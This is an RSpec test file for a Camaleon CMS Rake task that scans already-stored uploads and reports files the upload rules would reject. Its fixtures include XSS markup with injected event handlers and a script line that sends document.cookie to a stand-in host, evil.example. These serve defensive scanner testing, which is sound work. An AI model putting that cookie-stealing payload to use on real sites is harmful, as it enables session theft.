# frozen_string_literal: true

# The upload rules apply at upload time, so files stored before them are never re-examined. This
# task is the read-only way an operator sees what is already sitting under the media root.
RSpec.describe 'camaleon_cms:security:scan_uploads Rake task', type: :task do
  before(:all) { Rails.application.load_tasks } # rubocop:disable RSpec/BeforeAfterAll

  after(:all) do # rubocop:disable RSpec/BeforeAfterAll
    Rake::Task['camaleon_cms:security:scan_uploads'].clear
  end

  let(:task) { Rake::Task['camaleon_cms:security:scan_uploads'] }
  let(:site) { CamaleonCms::Site.first }
  let(:media_root) { Rails.public_path.join('media', site.id.to_s) }
  # cama_contact_form stores the files that visitors send under public/contact_form/<site id>. The
  # task reads the contact form folder too, so each example starts and ends without the folder of
  # its site.
  let(:contact_form_root) { Rails.public_path.join('contact_form', site.id.to_s) }
  # The task reads the whole contact form folder. The dummy app can hold the files of other spec
  # runs there. An example that counts the scanned files adds them, and it adds the ones that the
  # scan refuses to the refused count. The `before` hook reads the list after it removes the folder
  # of the site of the example.
  let(:other_contact_form_files) do
    Dir.glob(Rails.public_path.join('contact_form', '**', '*'), File::FNM_DOTMATCH).select { |path| File.file?(path) }
  end
  let(:other_refused_files) do
    scanner = Class.new { include CamaleonCms::UploaderContentSecurity }.new
    other_contact_form_files.count { |path| scanner.content_unsafe?(File.binread(path), filename: File.basename(path)) }
  end
  # The totals of a run with one file of the example, which the scan accepts.
  let(:totals_with_one_accepted_file) do
    /Done\. #{1 + other_contact_form_files.size} stored file\(s\) scanned, #{other_refused_files} would be rejected/
  end

  before do
    task.reenable
    FileUtils.rm_rf(contact_form_root)
    other_contact_form_files
    FileUtils.mkdir_p(media_root)
    allow(Rails.env).to receive(:test?).and_return(false)
  end

  after { FileUtils.rm_rf([media_root, contact_form_root]) }

  def store(name, content)
    path = media_root.join(name)
    FileUtils.mkdir_p(File.dirname(path))
    File.binwrite(path, content)
    path
  end

  it 'reports stored markup carrying a handler the old denylist missed' do
    store('legacy.html', %(<div onpointerdown="alert(1)">x</div>))

    expect { task.invoke }.to output(%r{Site #{site.id} /media/#{site.id}/legacy\.html: would be rejected}).to_stdout
  end

  it 'reports a stored script file' do
    store('legacy.js', %(fetch('https://evil.example/c?'+document.cookie)))

    expect { task.invoke }.to output(%r{/media/#{site.id}/legacy\.js: would be rejected}).to_stdout
  end

  it 'reports a file nested in a subfolder' do
    store('assets/deep/legacy.html', %(<div onpointerdown="alert(1)">x</div>))

    expect { task.invoke }.to output(%r{/media/#{site.id}/assets/deep/legacy\.html}).to_stdout
  end

  it 'leaves every reported file present and byte-identical' do
    contents = %(<div onpointerdown="alert(1)">x</div>)
    path = store('legacy.html', contents)

    expect { task.invoke }.to output(/would be rejected/).to_stdout
    expect(File.exist?(path)).to be(true)
    expect(File.binread(path)).to eq(contents)
  end

  it 'says plainly that a finding is not by itself evidence of compromise' do
    store('legacy.js', 'console.log(1)')

    expect { task.invoke }.to output(/not by itself evidence of compromise/).to_stdout
  end

  it 'reports nothing for a media root whose files all pass' do
    store('fine.png', "\x89PNG\r\n\x1a\n")
    store('fine.svg', %(<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>))

    # Matched on the per-file marker, not on "would be rejected" -- the summary line carries that
    # phrase too ("0 would be rejected"), so the looser pattern passes for the wrong reason. The
    # marker has the label of the site, because the contact form folder can hold a refused file of
    # another spec run.
    expect { task.invoke }.not_to output(/✗ Site #{site.id} /).to_stdout
  end

  it 'counts what it scanned even when nothing is flagged' do
    store('fine.png', "\x89PNG\r\n\x1a\n")

    expect { task.invoke }.to output(totals_with_one_accepted_file).to_stdout
  end

  it 'reports a file it cannot read rather than skipping it' do
    store('legacy.html', 'x')
    allow(File).to receive(:binread).and_raise(Errno::EACCES)

    expect { task.invoke }.to output(/would be rejected \(unreadable/).to_stdout
  end

  # A basename that is entirely an extension is what cama_upload_extension fail-closes on, yet a
  # plain glob skips leading-dot names -- so the report omitted its own strictest case.
  it 'reports a dotfile whose whole basename is an extension' do
    store('.js', 'console.log(1)')

    expect { task.invoke }.to output(%r{/media/#{site.id}/\.js: would be rejected}).to_stdout
  end

  context 'with private media stored outside the public root' do
    let(:private_root) { Rails.root.join(CamaleonCmsUploader::PRIVATE_DIRECTORY) }

    before { FileUtils.mkdir_p(private_root) }
    after { FileUtils.rm_f(private_root.join('legacy.js')) }

    # Private uploads are scanned at save time exactly like public ones, so the report must cover
    # them too rather than overstating its coverage by looking only under the public media root.
    it 'reports a flagged private-media file' do
      File.binwrite(private_root.join('legacy.js'), 'console.log(1)')

      expect { task.invoke }.to output(%r{Private media /private/legacy\.js: would be rejected}).to_stdout
    end
  end

  context 'with a file that a contact form stored' do
    before { FileUtils.mkdir_p(contact_form_root) }

    it 'reports a file that the scan refuses' do
      File.binwrite(contact_form_root.join('visitor.svg'),
                    %(<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>))

      expect { task.invoke }
        .to output(%r{Contact form /contact_form/#{site.id}/visitor\.svg: would be rejected}).to_stdout
    end

    it 'counts a file that passes, and does not report it' do
      File.binwrite(contact_form_root.join('visitor.png'), "\x89PNG\r\n\x1a\n")

      expect { task.invoke }.to output(totals_with_one_accepted_file).to_stdout
    end

    # The folder of a deleted site stays in public/, and the web server still serves its files.
    context 'when the folder has the id of a site that does not exist' do
      let(:orphan_root) { Rails.public_path.join('contact_form', (CamaleonCms::Site.unscoped.maximum(:id) + 1).to_s) }
      let(:orphan_file) { orphan_root.join('visitor.svg') }

      before { FileUtils.mkdir_p(orphan_root) }

      after do
        FileUtils.rm_f(orphan_file)
        Dir.rmdir(orphan_root) if Dir.empty?(orphan_root)
      end

      it 'reports a file that the scan refuses' do
        File.binwrite(orphan_file, %(<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>))

        expect { task.invoke }
          .to output(%r{Contact form /contact_form/#{orphan_root.basename}/visitor\.svg: would be rejected}).to_stdout
      end
    end
  end

  context 'when media_slug_folder stores uploads under media/<slug>' do
    let(:slug_root) { Rails.public_path.join('media', site.slug) }

    before do
      allow(PluginRoutes).to receive(:static_system_info)
        .and_return(PluginRoutes.static_system_info.merge('media_slug_folder' => true))
      FileUtils.mkdir_p(slug_root)
    end

    after { FileUtils.rm_rf(slug_root) }

    # Hardcoding media/<id> found nothing on a slug-configured install and printed a false all-clear.
    it 'scans the slug-named directory, not media/<id>' do
      File.binwrite(slug_root.join('legacy.js'), 'console.log(1)')

      expect { task.invoke }.to output(%r{/media/#{site.slug}/legacy\.js: would be rejected}).to_stdout
    end
  end
end
